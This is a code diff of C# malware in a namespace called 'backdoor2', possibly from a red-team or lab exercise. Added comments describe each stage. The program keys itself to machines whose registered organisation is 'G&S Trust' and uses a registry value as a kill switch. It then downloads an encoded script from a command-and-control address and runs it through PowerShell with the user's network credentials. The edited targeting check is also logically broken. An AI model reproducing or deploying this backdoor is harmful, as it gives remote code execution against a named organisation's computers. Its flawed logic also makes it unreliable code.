@@ -25,9 +25,7 @@ namespace backdoor2
     {
         static void Main(string[] args)
         {
-            //string name = null;
-
-            // check for appropriate screen requirement before displaying menu (fix)
+            // Check if running inside a VM
             if (Valid_environment())
             {
                 Custom_shape_ui();
@@ -42,11 +40,12 @@ namespace backdoor2
         static private void Custom_shape_ui()
         {
             RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\UEV\\Agent");
-            //If key is present, the backdoor exits
+            //If key is present, the backdoor exits (arbitrary kill switch when normal persistence is achieved)
             if (key != null)
             {
                 if (key.GetValue("Version") == null)
                 {
+                    //Start real backdoor logic
                     Custom_shape_ui_launcher();
 
                 }
@@ -56,10 +55,11 @@ namespace backdoor2
         static private void Custom_shape_ui_launcher()
         {
 
+            //Download encoded script from C2
             System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials;
             WebClient myWebClient = new WebClient();
             string mystring = myWebClient.DownloadString("http://10.62.144.17/script2.txt");
-
+            //Launch PS
             var p = new System.Diagnostics.Process();
             p.StartInfo.FileName = "powershell.exe";
             p.StartInfo.Arguments = mystring;
@@ -69,13 +69,14 @@ namespace backdoor2
         }
         static private bool Valid_environment()
         {
+            //Only run this script on a computer belonging to G&S Trust
             ManagementObjectSearcher search = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
             foreach (ManagementObject obj in search.Get())
             {
                 string name = obj["Organization"].ToString().Trim().ToLower();
                 // Change this condition result to make it run on your workstation
-                if (name.StartsWith("gs") || !name.StartsWith("g&s"))
-                    return true;
+                if (!name.StartsWith("gs") || !name.StartsWith("g&s") || !name.StartsWith("trus"))
+                    return false;
 
             }
             search = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
